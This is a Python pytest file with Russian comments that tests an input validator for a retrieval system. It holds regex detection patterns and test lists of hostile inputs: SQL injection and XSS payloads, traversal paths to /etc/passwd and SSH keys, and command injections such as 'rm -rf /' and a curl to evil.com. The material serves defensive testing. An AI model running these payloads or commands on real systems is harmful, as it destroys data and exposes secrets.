"""
Input security validation tests for RAG system.

This module implements comprehensive input validation:
- SQL injection prevention
- XSS protection
- Path traversal blocking
- Input sanitization
- Length and content validation

Ensures all user inputs are safe before processing.
"""

import re
from typing import Any, Dict, List, Optional
from unittest.mock import Mock

import pytest


class InputSecurityValidator:
    """
    Валидатор безопасности входных данных.

    Проверяет и sanitизирует все входные данные от пользователей.
    """

    def __init__(self):
        # Паттерны для обнаружения атак
        self.attack_patterns = {
            "sql_injection": [
                r";\s*(?:DROP|DELETE|UPDATE|INSERT|ALTER|CREATE)\s+",
                r"\b(?:UNION\s+SELECT|OR\s+1=1|AND\s+1=1)\b",
                r"--\s*$",  # SQL comments
                r"/\*.*\*/",  # Block comments
            ],
            "xss": [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"on\w+\s*=",
                r"<iframe[^>]*>",
                r"<object[^>]*>",
                r"<embed[^>]*>",
            ],
            "path_traversal": [
                r"\.\./",
                r"\.\.\\",
                r"%2e%2e%2f",  # URL encoded ../
                r"%2e%2e%5c",  # URL encoded ..\
                r"\.\.%2f",  # Mixed encoding
            ],
            "command_injection": [
                r"[;&|`$]\s*(?:cat|ls|pwd|whoami|wget|curl)\s+",
                r"\$\([^)]+\)",  # Command substitution
                r"`[^`]+`",  # Backtick execution
            ],
            "template_injection": [
                r"\{\{.*?\}\}",
                r"\{\%.*?\%\}",
                r"\$\{.*?\}",
            ],
        }

        # Максимальные длины
        self.max_lengths = {
            "query": 1000,
            "document_content": 100000,
            "file_path": 255,
            "user_id": 64,
        }

        # Разрешенные символы
        self.allowed_chars = {
            "query": r"^[а-яА-Яa-zA-Z0-9\s\.,!?\-\(\)\[\]{}:;\"']+$",
            "filename": r"^[а-яА-Яa-zA-Z0-9_\-\.\s]+$",
        }

    def validate_query_input(self, query: str) -> Dict[str, Any]:
        """
        Валидация входного запроса пользователя.

        Args:
            query: Запрос для валидации

        Returns:
            Dict с результатом валидации
        """
        result = {"valid": True, "sanitized": query, "warnings": [], "errors": []}

        # Проверка длины
        if len(query) > self.max_lengths["query"]:
            result["errors"].append(
                f"Query too long: {len(query)} > {self.max_lengths['query']}"
            )
            result["valid"] = False

        if len(query.strip()) == 0:
            result["errors"].append("Query is empty")
            result["valid"] = False

        # Проверка на паттерны атак
        for attack_type, patterns in self.attack_patterns.items():
            for pattern in patterns:
                if re.search(pattern, query, re.IGNORECASE | re.MULTILINE):
                    result["errors"].append(f"Potential {attack_type} detected")
                    result["valid"] = False
                    break

        # Проверка разрешенных символов
        if not re.match(self.allowed_chars["query"], query, re.UNICODE):
            result["warnings"].append("Query contains unusual characters")

        # Базовая санитизация
        result["sanitized"] = self._basic_sanitize(query)

        return result

    def validate_file_path(self, file_path: str) -> Dict[str, Any]:
        """
        Валидация пути к файлу.

        Args:
            file_path: Путь к файлу

        Returns:
            Dict с результатом валидации
        """
        result = {"valid": True, "sanitized": file_path, "warnings": [], "errors": []}

        # Проверка длины
        if len(file_path) > self.max_lengths["file_path"]:
            result["errors"].append(
                f"File path too long: {len(file_path)} > {self.max_lengths['file_path']}"
            )
            result["valid"] = False

        # Проверка на path traversal
        for pattern in self.attack_patterns["path_traversal"]:
            if re.search(pattern, file_path):
                result["errors"].append("Path traversal attempt detected")
                result["valid"] = False
                break

        # Проверка что путь не содержит опасных символов
        dangerous_chars = ["<", ">", "|", "&", "$", "`"]
        for char in dangerous_chars:
            if char in file_path:
                result["errors"].append(f"Dangerous character '{char}' in file path")
                result["valid"] = False

        # Проверка разрешенных символов для имени файла
        filename = (
            file_path.split("/")[-1] if "/" in file_path else file_path.split("\\")[-1]
        )
        if not re.match(self.allowed_chars["filename"], filename):
            result["warnings"].append("Filename contains unusual characters")

        return result

    def validate_document_content(self, content: str) -> Dict[str, Any]:
        """
        Валидация содержимого документа.

        Args:
            content: Содержимое документа

        Returns:
            Dict с результатом валидации
        """
        result = {"valid": True, "sanitized": content, "warnings": [], "errors": []}

        # Проверка длины
        if len(content) > self.max_lengths["document_content"]:
            result["errors"].append(
                f"Document too large: {len(content)} > {self.max_lengths['document_content']}"
            )
            result["valid"] = False

        # Проверка на XSS в контенте
        for pattern in self.attack_patterns["xss"]:
            if re.search(pattern, content, re.IGNORECASE):
                result["errors"].append("Potential XSS content detected")
                result["valid"] = False
                break

        # Проверка на SQL injection в контенте
        for pattern in self.attack_patterns["sql_injection"]:
            if re.search(pattern, content, re.IGNORECASE):
                result["errors"].append("Potential SQL injection in content")
                result["valid"] = False
                break

        # Проверка на бинарный контент (простая эвристика)
        binary_chars = 0
        for char in content[:1000]:  # Проверяем только начало
            if ord(char) < 32 and char not in "\n\r\t":
                binary_chars += 1

        if binary_chars > 10:  # Более 1% бинарных символов
            result["warnings"].append("Content appears to contain binary data")

        return result

    def _basic_sanitize(self, text: str) -> str:
        """
        Базовая санитизация текста.

        Args:
            text: Исходный текст

        Returns:
            Санитизированный текст
        """
        # Удаление лишних пробелов
        text = " ".join(text.split())

        # Удаление потенциально опасных символов
        dangerous_chars = ["\x00", "\r", "\x0b", "\x0c"]  # Null bytes, etc.
        for char in dangerous_chars:
            text = text.replace(char, "")

        return text.strip()

    def validate_batch_input(self, inputs: List[Dict[str, Any]]) -> Dict[str, Any]:
        """
        Валидация батча входных данных.

        Args:
            inputs: Список входных данных

        Returns:
            Dict с результатами валидации батча
        """
        results = {
            "valid_count": 0,
            "invalid_count": 0,
            "total_count": len(inputs),
            "errors": [],
            "warnings": [],
        }

        for i, input_data in enumerate(inputs):
            try:
                # Определяем тип валидации на основе ключей
                if "query" in input_data:
                    validation = self.validate_query_input(input_data["query"])
                elif "file_path" in input_data:
                    validation = self.validate_file_path(input_data["file_path"])
                elif "content" in input_data:
                    validation = self.validate_document_content(input_data["content"])
                else:
                    validation = {"valid": False, "errors": ["Unknown input type"]}

                if validation["valid"]:
                    results["valid_count"] += 1
                else:
                    results["invalid_count"] += 1
                    results["errors"].extend(
                        [f"Input {i}: {err}" for err in validation["errors"]]
                    )

                results["warnings"].extend(
                    [f"Input {i}: {warn}" for warn in validation["warnings"]]
                )

            except Exception as e:
                results["invalid_count"] += 1
                results["errors"].append(f"Input {i}: Validation error - {str(e)}")

        return results


class TestInputSecurity:
    """Тесты безопасности входных данных"""

    def __init__(self):
        self.validator = InputSecurityValidator()

    @pytest.mark.security
    def test_query_validation(self):
        """Тест валидации запросов"""
        # Корректный запрос
        result = self.validator.validate_query_input("What is machine learning?")
        assert result["valid"] == True
        assert len(result["errors"]) == 0

        # Слишком длинный запрос
        long_query = "A" * 2000
        result = self.validator.validate_query_input(long_query)
        assert result["valid"] == False
        assert "too long" in str(result["errors"])

        # Пустой запрос
        result = self.validator.validate_query_input("")
        assert result["valid"] == False
        assert "empty" in str(result["errors"])

    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Тест предотвращения SQL injection"""
        malicious_queries = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
            "'; SELECT * FROM users; --",
        ]

        for query in malicious_queries:
            result = self.validator.validate_query_input(query)
            assert result["valid"] == False, f"Failed to block SQL injection: {query}"
            assert any(
                "sql_injection" in err.lower() or "sql" in err.lower()
                for err in result["errors"]
            )

    @pytest.mark.security
    def test_xss_prevention(self):
        """Тест предотвращения XSS"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(\"xss\")'>",
        ]

        for payload in xss_payloads:
            result = self.validator.validate_query_input(payload)
            assert result["valid"] == False, f"Failed to block XSS: {payload}"
            assert any("xss" in err.lower() for err in result["errors"])

    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Тест предотвращения path traversal"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/home/user/../../../root/.ssh/id_rsa",
        ]

        for path in malicious_paths:
            result = self.validator.validate_file_path(path)
            assert result["valid"] == False, f"Failed to block path traversal: {path}"
            assert any("traversal" in err.lower() for err in result["errors"])

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Тест предотвращения command injection"""
        malicious_commands = [
            "; cat /etc/passwd",
            "| whoami",
            "`rm -rf /`",
            "$(curl http://evil.com)",
        ]

        for cmd in malicious_commands:
            result = self.validator.validate_query_input(cmd)
            assert result["valid"] == False, f"Failed to block command injection: {cmd}"
            assert any(
                "command" in err.lower() or "injection" in err.lower()
                for err in result["errors"]
            )

    @pytest.mark.security
    def test_file_path_validation(self):
        """Тест валидации путей к файлам"""
        # Корректные пути
        valid_paths = [
            "notes.txt",
            "documents/research.md",
            "code/python/main.py",
            "data/2023-12-01_notes.md",
        ]

        for path in valid_paths:
            result = self.validator.validate_file_path(path)
            assert result["valid"] == True, f"Incorrectly rejected valid path: {path}"

        # Некорректные пути
        invalid_paths = [
            "../../../etc/passwd",
            "file|with|pipes.txt",
            "file$with$dollar.py",
            "file`with`backticks.md",
        ]

        for path in invalid_paths:
            result = self.validator.validate_file_path(path)
            assert result["valid"] == False, f"Failed to reject invalid path: {path}"

    @pytest.mark.security
    def test_document_content_validation(self):
        """Тест валидации содержимого документов"""
        # Корректный контент
        valid_content = """
        # Machine Learning Notes

        Machine learning is a subset of artificial intelligence that enables
        systems to learn from data without being explicitly programmed.

        ## Key Concepts

        - Supervised Learning
        - Unsupervised Learning
        - Neural Networks
        """

        result = self.validator.validate_document_content(valid_content)
        assert result["valid"] == True

        # Контент со скриптами
        malicious_content = """
        # Research Notes

        <script>alert('This is malicious!');</script>

        Some legitimate content here.
        """

        result = self.validator.validate_document_content(malicious_content)
        assert result["valid"] == False
        assert any("xss" in err.lower() for err in result["errors"])

    @pytest.mark.security
    def test_batch_validation(self):
        """Тест пакетной валидации"""
        batch_inputs = [
            {"query": "Valid query"},
            {"query": "<script>alert('xss')</script>"},
            {"file_path": "valid.txt"},
            {"file_path": "../../../etc/passwd"},
            {"content": "Valid content"},
            {"content": "'; DROP TABLE users; --"},
        ]

        result = self.validator.validate_batch_input(batch_inputs)

        assert result["total_count"] == 6
        assert result["valid_count"] == 3  # valid query, valid path, valid content
        assert result["invalid_count"] == 3  # xss, path traversal, sql injection
        assert len(result["errors"]) > 0

    @pytest.mark.security
    def test_input_sanitization(self):
        """Тест санитизации входных данных"""
        # Текст с лишними пробелами и опасными символами
        dirty_text = "  Some   text  with\x00null\x0bbytes  "

        result = self.validator.validate_query_input(dirty_text)

        # Проверяем что санитизация работает
        sanitized = result["sanitized"]
        assert "\x00" not in sanitized  # Null bytes удалены
        assert "\x0b" not in sanitized  # Vertical tab удален
        assert "  " not in sanitized  # Двойные пробелы заменены
        assert sanitized.strip() == sanitized  # Нет лишних пробелов по краям


if __name__ == "__main__":
    # Запуск тестов безопасности входных данных
    pytest.main([__file__, "-v", "--tb=short", "-m", "security"])
